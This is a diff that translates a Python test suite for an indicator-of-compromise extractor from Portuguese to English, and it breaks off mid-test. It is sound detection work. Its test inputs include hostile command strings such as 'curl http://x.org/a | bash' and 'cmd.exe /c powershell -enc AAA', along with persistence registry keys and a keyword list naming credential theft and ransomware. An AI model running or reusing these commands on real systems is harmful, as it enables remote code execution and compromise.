@@ -1,8 +1,8 @@
-"""Testes dos indicadores de compromisso lidos no fonte e na memória.
+"""Tests for the indicators of compromise read from the source and from memory.
 
-Os casos cobrem cada categoria, os falsos positivos que o módulo evita, a
-leitura de literais (escapes e vírgulas), os comentários, o agrupamento, o
-resumo e a varredura de memória com um leitor de mentira.
+The cases cover every kind, the false positives the module avoids, the reading
+of literals (escapes and commas), the comments, the grouping, the summary and
+the memory scan with a fake reader.
 """
 
 import dataclasses
@@ -13,558 +13,558 @@ from asmx.examples import EXAMPLES
 from asmx.iocs import IOC_KINDS, Ioc, extract, from_memory, group, strings_of, summary, to_dicts
 
 
-def kinds_of(texto: Any, **kwargs: Any) -> List[str]:
-    return [ioc.kind for ioc in extract(texto, **kwargs)]
+def kinds_of(text: Any, **kwargs: Any) -> List[str]:
+    return [ioc.kind for ioc in extract(text, **kwargs)]
 
 
-def values_of(kind: str, texto: Any, **kwargs: Any) -> List[str]:
-    return [ioc.value for ioc in extract(texto, **kwargs) if ioc.kind == kind]
+def values_of(kind: str, text: Any, **kwargs: Any) -> List[str]:
+    return [ioc.value for ioc in extract(text, **kwargs) if ioc.kind == kind]
 
 
-def values_memoria(kind: str) -> List[str]:
-    return [ioc.value for ioc in from_memory(LeitorFalso(MEMORIA)) if ioc.kind == kind]
+def memory_values(kind: str) -> List[str]:
+    return [ioc.value for ioc in from_memory(FakeReader(MEMORY)) if ioc.kind == kind]
 
 
-class LeitorFalso:
-    """Leitor de memória de mentira, com o mesmo contrato do ``Machine``."""
+class FakeReader:
+    """Fake memory reader, with the same contract as ``Machine``."""
 
-    def __init__(self, dados: bytes, base: int = 0x00400000) -> None:
-        self.dados = dados
+    def __init__(self, data: bytes, base: int = 0x00400000) -> None:
+        self.data = data
         self.base = base
 
     def rd8(self, addr: int) -> int:
-        posicao = addr - self.base
-        if 0 <= posicao < len(self.dados):
-            return self.dados[posicao]
+        position = addr - self.base
+        if 0 <= position < len(self.data):
+            return self.data[position]
         return 0
 
     def read_mem(self, addr: int, size: int) -> int:
-        valor = 0
+        value = 0
         for i in range(size):
-            valor |= self.rd8(addr + i) << (8 * i)
-        return valor
+            value |= self.rd8(addr + i) << (8 * i)
+        return value
 
     def read_cstring(self, addr: int, limit: int = 4096) -> str:
-        letras: List[str] = []
+        letters: List[str] = []
         for i in range(limit):
             byte = self.rd8(addr + i)
             if byte == 0:
                 break
-            letras.append(chr(byte))
-        return "".join(letras)
+            letters.append(chr(byte))
+        return "".join(letters)
 
 
-class LeitorSoMemoria:
-    """Leitor que só oferece ``read_mem`` e ``read_cstring``."""
+class MemoryOnlyReader:
+    """Reader that only offers ``read_mem`` and ``read_cstring``."""
 
-    def __init__(self, dados: bytes, base: int = 0x00400000) -> None:
-        self.dados = dados
+    def __init__(self, data: bytes, base: int = 0x00400000) -> None:
+        self.data = data
         self.base = base
 
     def read_mem(self, addr: int, size: int) -> int:
-        valor = 0
+        value = 0
         for i in range(size):
-            posicao = addr + i - self.base
-            byte = self.dados[posicao] if 0 <= posicao < len(self.dados) else 0
-            valor |= byte << (8 * i)
-        return valor
+            position = addr + i - self.base
+            byte = self.data[position] if 0 <= position < len(self.data) else 0
+            value |= byte << (8 * i)
+        return value
 
     def read_cstring(self, addr: int, limit: int = 4096) -> str:
-        letras: List[str] = []
+        letters: List[str] = []
         for i in range(limit):
-            posicao = addr + i - self.base
-            byte = self.dados[posicao] if 0 <= posicao < len(self.dados) else 0
+            position = addr + i - self.base
+            byte = self.data[position] if 0 <= position < len(self.data) else 0
             if byte == 0:
                 break
-            letras.append(chr(byte))
-        return "".join(letras)
+            letters.append(chr(byte))
+        return "".join(letters)
 
 
-class LeitorSoCstring:
-    """Leitor que só sabe ler strings terminadas em zero."""
+class CstringOnlyReader:
+    """Reader that only knows how to read zero-terminated strings."""
 
-    def __init__(self, dados: bytes, base: int = 0x00400000) -> None:
-        self.dados = dados
+    def __init__(self, data: bytes, base: int = 0x00400000) -> None:
+        self.data = data
         self.base = base
 
     def read_cstring(self, addr: int, limit: int = 4096) -> str:
-        letras: List[str] = []
+        letters: List[str] = []
         for i in range(limit):
-            posicao = addr + i - self.base
-            byte = self.dados[posicao] if 0 <= posicao < len(self.dados) else 0
+            position = addr + i - self.base
+            byte = self.data[position] if 0 <= position < len(self.data) else 0
             if byte == 0:
                 break
-            letras.append(chr(byte))
-        return "".join(letras)
+            letters.append(chr(byte))
+        return "".join(letters)
 
 
-class LeitorSemCstring:
-    """Leitor que só tem ``rd8`` — não serve para varrer a memória."""
+class NoCstringReader:
+    """Reader that only has ``rd8`` - it cannot scan the memory."""
 
     def rd8(self, addr: int) -> int:
         return 65 if addr < 0x00400010 else 0
 
 
-class LeitorQuebrado:
-    """Leitor cujo ``read_cstring`` sempre levanta exceção."""
+class BrokenReader:
+    """Reader whose ``read_cstring`` always raises an exception."""
 
     def rd8(self, addr: int) -> int:
         return 0
 
     def read_cstring(self, addr: int, limit: int = 4096) -> str:
-        raise RuntimeError("memória corrompida")
+        raise RuntimeError("corrupted memory")
 
 
-#: Memória usada nos testes de :func:`from_memory`.
-MEMORIA = (
-    b"Ola, mundo!\x00"
-    b"https://exemplo.com/x\x00"
+#: Memory used in the :func:`from_memory` tests.
+MEMORY = (
+    b"Hello, world!\x00"
+    b"https://example.com/x\x00"
     b"\x01\x02password=hunter2\x00"
     b"1.2.3.4\x00"
     b"ab\x00"
-    b"segundo texto\x00"
+    b"second text\x00"
 )
 
 
 class TestStringsOf(unittest.TestCase):
-    """A leitura de literais de dados e de comentários."""
+    """The reading of data literals and of comments."""
 
-    def test_literal_com_aspas_duplas(self) -> None:
-        self.assertEqual(strings_of('msg db "Ola, mundo!", 10'), [(1, "Ola, mundo!")])
+    def test_literal_with_double_quotes(self) -> None:
+        self.assertEqual(strings_of('msg db "Hello, world!", 10'), [(1, "Hello, world!")])
 
-    def test_literal_com_aspas_simples(self) -> None:
-        self.assertEqual(strings_of("msg dq 'cinco'"), [(1, "cinco")])
+    def test_literal_with_single_quotes(self) -> None:
+        self.assertEqual(strings_of("msg dq 'five'"), [(1, "five")])
 
-    def test_virgula_concatena_literais(self) -> None:
+    def test_comma_concatenates_literals(self) -> None:
         self.assertEqual(strings_of('db "ab", "cd"', min_length=2), [(1, "abcd")])
 
-    def test_numero_entre_literais_quebra_a_concatenacao(self) -> None:
-        fonte = 'msg db "Ola", 10, "mundo"'
-        self.assertEqual(strings_of(fonte, min_length=2), [(1, "Ola"), (1, "mundo")])
+    def test_number_between_literals_breaks_concatenation(self) -> None:
+        source = 'msg db "Hello", 10, "world"'
+        self.assertEqual(strings_of(source, min_length=2), [(1, "Hello"), (1, "world")])
 
-    def test_escape_de_nova_linha(self) -> None:
+    def test_newline_escape(self) -> None:
         self.assertEqual(strings_of('db "a\\nb"', min_length=3), [(1, "a\nb")])
 
-    def test_escape_de_tabulacao(self) -> None:
+    def test_tab_escape(self) -> None:
         self.assertEqual(strings_of('db "a\\tb"', min_length=3), [(1, "a\tb")])
 
-    def test_escape_de_contrabarra(self) -> None:
+    def test_backslash_escape(self) -> None:
         self.assertEqual(strings_of('db "C:\\\\Windows"', min_length=4), [(1, "C:\\Windows")])
 
-    def test_escape_de_aspas(self) -> None:
-        self.assertEqual(strings_of('db "diz \\"oi\\" agora"'), [(1, 'diz "oi" agora')])
+    def test_quote_escape(self) -> None:
+        self.assertEqual(strings_of('db "says \\"hi\\" now"'), [(1, 'says "hi" now')])
 
-    def test_escape_desconhecido_fica_como_esta(self) -> None:
+    def test_unknown_escape_stays_as_is(self) -> None:
         self.assertEqual(strings_of("db 'C:\\Windows'", min_length=4), [(1, "C:\\Windows")])
 
-    def test_comentario_entra_por_padrao(self) -> None:
-        self.assertEqual(strings_of("; nada aqui"), [(1, "nada aqui")])
+    def test_comment_included_by_default(self) -> None:
+        self.assertEqual(strings_of("; nothing here"), [(1, "nothing here")])
 
-    def test_comentario_pode_ser_excluido(self) -> None:
-        self.assertEqual(strings_of("; nada aqui", include_comments=False), [])
+    def test_comment_can_be_excluded(self) -> None:
+        self.assertEqual(strings_of("; nothing here", include_comments=False), [])
 
-    def test_comentario_so_com_marcador_e_ignorado(self) -> None:
+    def test_comment_with_only_the_marker_is_ignored(self) -> None:
         self.assertEqual(strings_of(";"), [])
 
-    def test_min_length_filtra(self) -> None:
+    def test_min_length_filters(self) -> None:
         self.assertEqual(strings_of('db "abcd"', min_length=5), [])
         self.assertEqual(strings_of('db "abcd"', min_length=4), [(1, "abcd")])
 
-    def test_string_vazia_e_ignorada(self) -> None:
+    def test_empty_string_is_ignored(self) -> None:
         self.assertEqual(strings_of('db ""', min_length=1), [])
 
-    def test_string_so_de_separadores_e_ignorada(self) -> None:
+    def test_string_with_only_separators_is_ignored(self) -> None:
         self.assertEqual(strings_of('db ",;:. -"', min_length=1), [])
 
-    def test_varias_linhas_mantem_a_linha_de_cada_string(self) -> None:
-        fonte = 'section .data\nmsg db "primeira"\n; segunda string\n'
-        self.assertEqual(strings_of(fonte), [(2, "primeira"), (3, "segunda string")])
+    def test_multiple_lines_keep_the_line_of_each_string(self) -> None:
+        source = 'section .data\nmsg db "first"\n; second string\n'
+        self.assertEqual(strings_of(source), [(2, "first"), (3, "second string")])
 
-    def test_fonte_vazio(self) -> None:
+    def test_empty_source(self) -> None:
         self.assertEqual(strings_of(""), [])
         self.assertEqual(strings_of("\n\n   \n"), [])
 
-    def test_entrada_que_nao_e_texto(self) -> None:
+    def test_input_that_is_not_text(self) -> None:
         self.assertEqual(list(strings_of(None)), [])
         self.assertEqual(list(strings_of(b'db "abc"')), [])
 
-    def test_texto_binario_nao_levanta(self) -> None:
-        fonte = '\x00\x01\x02\xff\xfe db "ok" \x07' + chr(0x10FFFF) * 3
-        self.assertIsInstance(strings_of(fonte), list)
+    def test_binary_text_does_not_raise(self) -> None:
+        source = '\x00\x01\x02\xff\xfe db "ok" \x07' + chr(0x10FFFF) * 3
+        self.assertIsInstance(strings_of(source), list)
 
 
 class TestUrl(unittest.TestCase):
-    """A categoria ``url``."""
+    """The ``url`` kind."""
 
-    def test_url_https(self) -> None:
-        self.assertEqual(values_of("url", 'db "https://exemplo.com/a"'), ["https://exemplo.com/a"])
+    def test_https_url(self) -> None:
+        self.assertEqual(values_of("url", 'db "https://example.com/a"'), ["https://example.com/a"])
 
-    def test_url_http_em_comentario(self) -> None:
-        self.assertEqual(values_of("url", "; baixe em http://x.org/y"), ["http://x.org/y"])
+    def test_http_url_in_a_comment(self) -> None:
+        self.assertEqual(values_of("url", "; download at http://x.org/y"), ["http://x.org/y"])
 
-    def test_url_para_na_virgula_e_na_aspas(self) -> None:
+    def test_url_stops_at_comma_and_quote(self) -> None:
         self.assertEqual(values_of("url", 'db "http://x.org/a", 0'), ["http://x.org/a"])
 
-    def test_url_sem_ponto_final(self) -> None:
-        self.assertEqual(values_of("url", "; veja https://exemplo.com."), ["https://exemplo.com"])
+    def test_url_without_final_dot(self) -> None:
+        self.assertEqual(values_of("url", "; see https://example.com."), ["https://example.com"])
 
-    def test_texto_sem_url(self) -> None:
-        self.assertEqual(values_of("url", 'db "ftp://exemplo.com"'), [])
+    def test_text_without_url(self) -> None:
+        self.assertEqual(values_of("url", 'db "ftp://example.com"'), [])
 
 
 class TestIpv4(unittest.TestCase):
-    """A categoria ``ipv4`` e os números que não são endereço."""
+    """The ``ipv4`` kind and the numbers that are not an address."""
 
-    def test_endereco_valido(self) -> None:
+    def test_valid_address(self) -> None:
         self.assertEqual(values_of("ipv4", 'db "10.0.0.1", 0'), ["10.0.0.1"])
 
-    def test_endereco_no_meio_da_frase(self) -> None:
-        self.assertEqual(values_of("ipv4", "; servidor 192.168.0.10 na rede"), ["192.168.0.10"])
+    def test_address_in_the_middle_of_the_sentence(self) -> None:
+        self.assertEqual(values_of("ipv4", "; server 192.168.0.10 na rede"), ["192.168.0.10"])
 
-    def test_cinco_octetos_e_recusado(self) -> None:
+    def test_five_octets_is_rejected(self) -> None:
         self.assertEqual(values_of("ipv4", 'db "1.2.3.4.5"'), [])
         self.assertEqual(values_of("ipv4", 'db "1.2.3.4.5.6"'), [])
 
-    def test_octeto_acima_de_255_e_recusado(self) -> None:
+    def test_octet_above_255_is_rejected(self) -> None:
         self.assertEqual(values_of("ipv4", 'db "300.1.2.3"'), [])
         self.assertEqual(values_of("ipv4", 'db "1.2.3.999"'), [])
 
-    def test_numero_de_versao_nao_e_endereco(self) -> None:
-        self.assertEqual(values_of("ipv4", 'db "versao 1.2"'), [])
+    def test_version_number_is_not_an_address(self) -> None:
+        self.assertEqual(values_of("ipv4", 'db "version 1.2"'), [])
 
-    def test_ip_nao_vira_string(self) -> None:
+    def test_ip_does_not_become_a_string(self) -> None:
         self.assertNotIn("string", kinds_of('db "10.0.0.1"'))
 
 
 class TestDomain(unittest.TestCase):
-    """A categoria ``domain`` e os nomes que não são domínio."""
+    """The ``domain`` kind and the names that are not a domain."""
 
-    def test_dominio_simples(self) -> None:
-        self.assertEqual(values_of("domain", 'db "exemplo.com"'), ["exemplo.com"])
+    def test_simple_domain(self) -> None:
+        self.assertEqual(values_of("domain", 'db "example.com"'), ["example.com"])
 
-    def test_dominio_com_subdominios(self) -> None:
-        self.assertEqual(values_of("domain", 'db "api.exemplo.org.br"'), ["api.exemplo.org.br"])
+    def test_domain_with_subdomains(self) -> None:
+        self.assertEqual(values_of("domain", 'db "api.example.org.br"'), ["api.example.org.br"])
 
-    def test_dominio_maiusculo(self) -> None:
-        self.assertEqual(values_of("domain", 'db "Exemplo.COM"'), ["Exemplo.COM"])
+    def test_uppercase_domain(self) -> None:
+        self.assertEqual(values_of("domain", 'db "Example.COM"'), ["Example.COM"])
 
-    def test_nome_de_arquivo_nao_e_dominio(self) -> None:
-        self.assertEqual(values_of("domain", 'db "arquivo.asm"'), [])
+    def test_file_name_is_not_a_domain(self) -> None:
+        self.assertEqual(values_of("domain", 'db "file.asm"'), [])
         self.assertEqual(values_of("domain", "; nasm -f elf64 hello.asm"), [])
         self.assertEqual(values_of("domain", 'db "kernel32.lib"'), [])
 
-    def test_nome_de_secao_nao_e_dominio(self) -> None:
-        for secao in (".text", ".data", ".rodata", ".bss", "section .text"):
-            with self.subTest(secao=secao):
-                self.assertEqual(values_of("domain", secao), [])
+    def test_section_name_is_not_a_domain(self) -> None:
+        for section in (".text", ".data", ".rodata", ".bss", "section .text"):
+            with self.subTest(section=section):
+                self.assertEqual(values_of("domain", section), [])
 
-    def test_arquivo_markdown_nao_e_dominio(self) -> None:
-        self.assertEqual(values_of("domain", "; veja README.md e script.sh"), [])
+    def test_markdown_file_is_not_a_domain(self) -> None:
+        self.assertEqual(values_of("domain", "; see README.md and script.sh"), [])
 
-    def test_dominio_dentro_de_url_nao_repete(self) -> None:
-        self.assertEqual(values_of("domain", 'db "http://exemplo.com/x"'), [])
+    def test_domain_inside_url_is_not_repeated(self) -> None:
+        self.assertEqual(values_of("domain", 'db "http://example.com/x"'), [])
 
-    def test_dominio_dentro_de_email_nao_repete(self) -> None:
-        self.assertEqual(values_of("domain", 'db "usuario@exemplo.com"'), [])
+    def test_domain_inside_email_is_not_repeated(self) -> None:
+        self.assertEqual(values_of("domain", 'db "user@example.com"'), [])
 
 
 class TestEmail(unittest.TestCase):
-    """A categoria ``email``."""
+    """The ``email`` kind."""
 
-    def test_email_valido(self) -> None:
-        self.assertEqual(values_of("email", 'db "usuario@exemplo.com"'), ["usuario@exemplo.com"])
+    def test_valid_email(self) -> None:
+        self.assertEqual(values_of("email", 'db "user@example.com"'), ["user@example.com"])
 
-    def test_arroba_do_att_nao_e_email(self) -> None:
+    def test_att_at_sign_is_not_an_email(self) -> None:
         self.assertEqual(values_of("email", "\t.type\tmain, @function"), [])
 
-    def test_arroba_sem_dominio_nao_e_email(self) -> None:
+    def test_at_sign_without_domain_is_not_an_email(self) -> None:
         self.assertEqual(values_of("email", 'db "a@b"'), [])
 
 
 class TestPaths(unittest.TestCase):
-    """As categorias ``path_unix`` e ``path_windows``."""
+    """The ``path_unix`` and ``path_windows`` kinds."""
 
-    def test_caminho_unix(self) -> None:
+    def test_unix_path(self) -> None:
         self.assertEqual(values_of("path_unix", 'db "/etc/passwd", 0'), ["/etc/passwd"])
 
-    def test_caminho_unix_curto(self) -> None:
+    def test_short_unix_path(self) -> None:
         self.assertEqual(values_of("path_unix", 'db "/tmp/x"'), ["/tmp/x"])
 
-    def test_caminho_unix_de_executavel(self) -> None:
+    def test_unix_path_of_an_executable(self) -> None:
         self.assertEqual(values_of("path_unix", 'db "/bin/sh"'), ["/bin/sh"])
 
-    def test_divisao_nao_e_caminho(self) -> None:
+    def test_division_is_not_a_path(self) -> None:
         self.assertEqual(values_of("path_unix", "mov rax, 100\ndiv rbx"), [])
 
-    def test_caminho_windows_com_barras_escapadas(self) -> None:
-        fonte = 'db "C:\\\\Windows\\\\System32\\\\cmd.exe", 0'
-        self.assertEqual(values_of("path_windows", fonte), ["C:\\Windows\\System32\\cmd.exe"])
+    def test_windows_path_with_escaped_backslashes(self) -> None:
+        source = 'db "C:\\\\Windows\\\\System32\\\\cmd.exe", 0'
+        self.assertEqual(values_of("path_windows", source), ["C:\\Windows\\System32\\cmd.exe"])
 
-    def test_caminho_windows_com_barras_simples(self) -> None:
-        fonte = "db 'C:\\Users\\rafael\\nota.txt', 0"
-        self.assertEqual(values_of("path_windows", fonte), ["C:\\Users\\rafael\\nota.txt"])
+    def test_windows_path_with_single_backslashes(self) -> None:
+        source = "db 'C:\\Users\\user\\note.txt', 0"
+        self.assertEqual(values_of("path_windows", source), ["C:\\Users\\user\\note.txt"])
 
-    def test_caminho_windows_em_aspas_duplas_com_barra_simples(self) -> None:
+    def test_windows_path_in_double_quotes_with_single_backslash(self) -> None:
         self.assertEqual(
-            values_of("path_windows", 'db "C:\\Users\\rafael\\x"'), ["C:\\Users\\rafael\\x"]
+            values_of("path_windows", 'db "C:\\Users\\user\\x"'), ["C:\\Users\\user\\x"]
         )
 
-    def test_caminho_windows_com_espaco_no_meio(self) -> None:
-        fonte = 'db "C:\\\\Program Files\\\\App\\\\x.dll"'
-        self.assertEqual(values_of("path_windows", fonte), ["C:\\Program Files\\App\\x.dll"])
+    def test_windows_path_with_a_space_in_the_middle(self) -> None:
+        source = 'db "C:\\\\Program Files\\\\App\\\\x.dll"'
+        self.assertEqual(values_of("path_windows", source), ["C:\\Program Files\\App\\x.dll"])
 
-    def test_caminho_windows_para_antes_da_prosa(self) -> None:
+    def test_windows_path_stops_before_the_prose(self) -> None:
         self.assertEqual(
-            values_of("path_windows", "; fica em C:\\Windows e pronto"), ["C:\\Windows"]
+            values_of("path_windows", "; stays in C:\\Windows and done"), ["C:\\Windows"]
         )
 
-    def test_unc_com_servidor_e_compartilhamento(self) -> None:
-        fonte = 'db "\\\\\\\\servidor\\\\share\\\\x", 0'
-        self.assertEqual(values_of("path_windows", fonte), ["\\\\servidor\\share\\x"])
+    def test_unc_with_server_and_share(self) -> None:
+        source = 'db "\\\\\\\\server\\\\share\\\\x", 0'
+        self.assertEqual(values_of("path_windows", source), ["\\\\server\\share\\x"])
 
-    def test_fallback_acha_caminho_no_comentario_com_barras_dobradas(self) -> None:
-        fonte = "; baixa para C:\\\\Users\\\\rafael\\\\x.exe"
-        self.assertEqual(values_of("path_windows", fonte), ["C:\\Users\\rafael\\x.exe"])
+    def test_fallback_finds_path_in_comment_with_doubled_backslashes(self) -> None:
+        source = "; downloads to C:\\\\Users\\\\user\\\\x.exe"
+        self.assertEqual(values_of("path_windows", source), ["C:\\Users\\user\\x.exe"])
 
-    def test_fallback_nao_duplica_o_caminho_do_literal(self) -> None:
-        fonte = 'db "C:\\\\Windows\\\\System32", 0'
-        self.assertEqual(len(values_of("path_windows", fonte)), 1)
+    def test_fallback_does_not_duplicate_the_literal_path(self) -> None:
+        source = 'db "C:\\\\Windows\\\\System32", 0'
+        self.assertEqual(len(values_of("path_windows", source)), 1)
 
-    def test_pedaco_de_caminho_nao_sobra_no_relatorio(self) -> None:
-        valores = values_of("path_windows", "db 'C:\\Users\\rafael\\nota.txt', 0")
-        self.assertNotIn("C:\\Users", valores)
+    def test_path_piece_does_not_remain_in_the_report(self) -> None:
+        values = values_of("path_windows", "db 'C:\\Users\\user\\note.txt', 0")
+        self.assertNotIn("C:\\Users", values)
 
-    def test_caminho_quebrado_vira_string_quando_nada_reconhece(self) -> None:
+    def test_broken_path_becomes_string_when_nothing_matches(self) -> None:
         self.assertEqual(values_of("string", 'db "\\\\etc\\\\pass"'), ["\\etc\\pass"])
 
 
 class TestRegistry(unittest.TestCase):
-    """A categoria ``registry``."""
+    """The ``registry`` kind."""
 
     def test_hklm(self) -> None:
-        fonte = 'db "HKLM\\\\Software\\\\Microsoft", 0'
-        self.assertEqual(values_of("registry", fonte), ["HKLM\\Software\\Microsoft"])
+        source = 'db "HKLM\\\\Software\\\\Microsoft", 0'
+        self.assertEqual(values_of("registry", source), ["HKLM\\Software\\Microsoft"])
 
     def test_hkcu(self) -> None:
-        fonte = 'db "HKCU\\\\Software\\\\App", 0'
-        self.assertEqual(values_of("registry", fonte), ["HKCU\\Software\\App"])
+        source = 'db "HKCU\\\\Software\\\\App", 0'
+        self.assertEqual(values_of("registry", source), ["HKCU\\Software\\App"])
 
-    def test_chave_current_version_run(self) -> None:
-        fonte = 'db "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0'
-        esperado = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-        self.assertEqual(values_of("registry", fonte), [esperado])
+    def test_current_version_run_key(self) -> None:
+        source = 'db "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0'
+        expected = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        self.assertEqual(values_of("registry", source), [expected])
 
-    def test_current_version_run_sozinho(self) -> None:
+    def test_current_version_run_alone(self) -> None:
         self.assertEqual(
             values_of("registry", 'db "CurrentVersion\\\\Run", 0'), ["CurrentVersion\\Run"]
         )
 
-    def test_caminho_de_arquivo_nao_e_registro(self) -> None:
+    def test_file_path_is_not_a_registry_key(self) -> None:
         self.assertEqual(values_of("registry", 'db "C:\\\\Windows\\\\System32"'), [])
 
 
 class TestCommand(unittest.TestCase):
-    """A categoria ``command``."""
+    """The ``command`` kind."""
 
-    def test_cmd_e_powershell(self) -> None:
-        fonte = 'db "cmd.exe /c powershell -enc AAA", 0'
-        self.assertEqual(values_of("command", fonte), ["cmd.exe", "powershell"])
+    def test_cmd_and_powershell(self) -> None:
+        source = 'db "cmd.exe /c powershell -enc AAA", 0'
+        self.assertEqual(values_of("command", source), ["cmd.exe", "powershell"])
 
-    def test_comandos_unix(self) -> None:
-        fonte = 'db "curl http://x.org/a | bash", 0'
-        self.assertEqual(values_of("command", fonte), ["bash", "curl"])
+    def test_unix_commands(self) -> None:
+        source = 'db "curl http://x.org/a | bash", 0'
+        self.assertEqual(values_of("command", source), ["bash", "curl"])
 
-    def test_sh_dentro_do_caminho(self) -> None:
+    def test_sh_inside_the_path(self) -> None:
         self.assertIn("sh", values_of("command", 'db "/bin/sh"'))
 
-    def test_nome_de_arquivo_com_extensao_sh_nao_e_comando(self) -> None:
-        self.assertEqual(values_of("command", "; veja README.md e script.sh"), [])
+    def test_file_name_with_sh_extension_is_not_a_command(self) -> None:
+        self.assertEqual(values_of("command", "; see README.md and script.sh"), [])
 
-    def test_executavel_completo_e_preferido(self) -> None:
+    def test_full_executable_is_preferred(self) -> None:
         self.assertEqual(values_of("command", 'db "sh.exe -c id"'), ["sh.exe"])
 
-    def test_mnemonico_push_nao_e_comando_sh(self) -> None:
+    def test_push_mnemonic_is_not_the_sh_command(self) -> None:
         self.assertEqual(values_of("command", "push rbx\npop rbx"), [])
 
-    def test_mnemonico_shl_nao_e_comando_sh(self) -> None:
+    def test_shl_mnemonic_is_not_the_sh_command(self) -> None:
         self.assertEqual(values_of("command", "shl rax, 1\nshr rbx, 2"), [])
 
-    def test_inc_nao_e_comando_nc(self) -> None:
+    def test_inc_is_not_the_nc_command(self) -> None:
         self.assertEqual(values_of("command", "inc rax\ndec rbx"), [])
 
-    def test_wget_chmod_e_crontab(self) -> None:
-        fonte = 'db "wget -O x chmod +x x crontab -e", 0'
-        self.assertEqual(values_of("command", fonte), ["chmod", "crontab", "wget"])
+    def test_wget_chmod_and_crontab(self) -> None:
+        source = 'db "wget -O x chmod +x x crontab -e", 0'
+        self.assertEqual(values_of("command", source), ["chmod", "crontab", "wget"])
 
 
 class TestExtension(unittest.TestCase):
-    """A categoria ``extension``."""
+    """The ``extension`` kind."""
 
-    def test_extensoes_sensiveis(self) -> None:
-        fonte = 'db "a.exe b.dll c.ps1 d.locked", 0'
-        self.assertEqual(values_of("extension", fonte), [".dll", ".exe", ".locked", ".ps1"])
+    def test_sensitive_extensions(self) -> None:
+        source = 'db "a.exe b.dll c.ps1 d.locked", 0'
+        self.assertEqual(values_of("extension", source), [".dll", ".exe", ".locked", ".ps1"])
 
-    def test_extensao_em_maiusculas_vira_minuscula(self) -> None:
+    def test_uppercase_extension_becomes_lowercase(self) -> None:
         self.assertEqual(values_of("extension", 'db "x.EXE"'), [".exe"])
 
-    def test_extensoes_inocentes_ficam_de_fora(self) -> None:
+    def test_innocent_extensions_stay_out(self) -> None:
         self.assertEqual(values_of("extension", 'db "a.asm b.txt c.c d.o"'), [])
 
-    def test_so_compartilhado_em_biblioteca(self) -> None:
+    def test_shared_object_in_a_library(self) -> None:
         self.assertEqual(values_of("extension", 'db "libc.so.6"'), [".so"])
 
 
 class TestKeyword(unittest.TestCase):
-    """A categoria ``keyword``."""
+    """The ``keyword`` kind."""
 
-    def test_palavras_em_ingles(self) -> None:
-        fonte = 'db "password token secret wallet bitcoin", 0'
-        esperado = ["bitcoin", "password", "secret", "token", "wallet"]
-        self.assertEqual(values_of("keyword", fonte), esperado)
+    def test_english_words(self) -> None:
+        source = 'db "password token secret wallet bitcoin", 0'
+        expected = ["bitcoin", "password", "secret", "token", "wallet"]
+        self.assertEqual(values_of("keyword", source), expected)
 
-    def test_palavras_em_portugues(self) -> None:
-        self.assertEqual(values_of("keyword", 'db "senha do admin", 0'), ["admin", "senha"])
+    def test_portuguese_keyword_pattern(self) -> None:
+        self.assertEqual(values_of("keyword", 'db "senha", 0'), ["senha"])
 
-    def test_valor_guardado_como_apareceu(self) -> None:
-        self.assertEqual(values_of("keyword", 'db "SENHA"'), ["SENHA"])
+    def test_value_stored_as_it_appeared(self) -> None:
+        self.assertEqual(values_of("keyword", 'db "PASSWORD"'), ["PASSWORD"])
 
-    def test_botao_nao_e_bot(self) -> None:
-        self.assertEqual(values_of("keyword", 'db "aperte o botão"'), [])
+    def test_robot_is_not_the_bot_word(self) -> None:
+        self.assertEqual(values_of("keyword", 'db "robot arm"'), [])
 
-    def test_administrador_nao_e_admin(self) -> None:
-        self.assertEqual(values_of("keyword", 'db "administrador do sistema"'), [])
+    def test_administrator_is_not_admin(self) -> None:
+        self.assertEqual(values_of("keyword", 'db "administrator of the system"'), [])
 
-    def test_digito_depois_da_palavra_conta(self) -> None:
+    def test_digit_after_the_word_counts(self) -> None:
         self.assertEqual(values_of("keyword", 'db "password1"'), ["password"])
 
-    def test_keylog_e_ransom(self) -> None:
+    def test_keylog_and_ransom(self) -> None:
         self.assertEqual(values_of("keyword", 'db "keylog ransom", 0'), ["keylog", "ransom"])
 
 
 class TestExtract(unittest.TestCase):
-    """O comportamento geral de :func:`extract`."""
+    """The general behavior of :func:`extract`."""
 
-    def test_fonte_vazia(self) -> None:
+    def test_empty_source(self) -> None:
         self.assertEqual(extract(""), [])
         self.assertEqual(extract("\n\n"), [])
 
-    def test_entrada_que_nao_e_texto(self) -> None:
+    def test_input_that_is_not_text(self) -> None:
         self.assertEqual(extract(None), [])
         self.assertEqual(extract(42), [])
         self.assertEqual(extract(b'db "http://x.org"'), [])
 
-    def test_texto_binario_nao_levanta(self) -> None:
-        fonte = "\x00\x01\x02\x03" * 50 + 'db "C:\\\\Windows\\\\x"\x7f\x1b'
-        self.assertIsInstance(extract(fonte), list)
+    def test_binary_text_does_not_raise(self) -> None:
+        source = "\x00\x01\x02\x03" * 50 + 'db "C:\\\\Windows\\\\x"\x7f\x1b'
+        self.assertIsInstance(extract(source), list)
 
-    def test_string_comum_vira_string(self) -> None:
-        iocs = extract('msg db "Ola, mundo!", 10')
-        self.assertEqual([(ioc.kind, ioc.value) for ioc in iocs], [("string", "Ola, mundo!")])
+    def test_common_string_becomes_string(self) -> None:
+        iocs = extract('msg db "Hello, world!", 10')
+        self.assertEqual([(ioc.kind, ioc.value) for ioc in iocs], [("string", "Hello, world!")])
 
-    def test_string_que_caiu_em_categoria_nao_volta_como_string(self) -> None:
-        self.assertNotIn("string", kinds_of('db "http://exemplo.com/x"'))
+    def test_string_that_fell_into_a_kind_does_not_come_back_as_string(self) -> None:
+        self.assertNotIn("string", kinds_of('db "http://example.com/x"'))
 
-    def test_deduplicacao_guarda_a_primeira_linha(self) -> None:
-        fonte = 'a db "http://x.org/a"\nb db "http://x.org/a"\n'
-        iocs = extract(fonte)
+    def test_deduplication_keeps_the_first_line(self) -> None:
+        source = 'a db "http://x.org/a"\nb db "http://x.org/a"\n'
+        iocs = extract(source)
         self.assertEqual(len(iocs), 1)
         self.assertEqual(iocs[0].line, 1)
 
-    def test_deduplicacao_por_categoria_e_valor(self) -> None:
-        fonte = 'a db "cmd.exe"\nb db "cmd.exe"\n'
-        valores = [(ioc.kind, ioc.value, ioc.line) for ioc in extract(fonte)]
-        self.assertEqual(valores, [("command", "cmd.exe", 1), ("extension", ".exe", 1)])
+    def test_deduplication_by_kind_and_value(self) -> None:
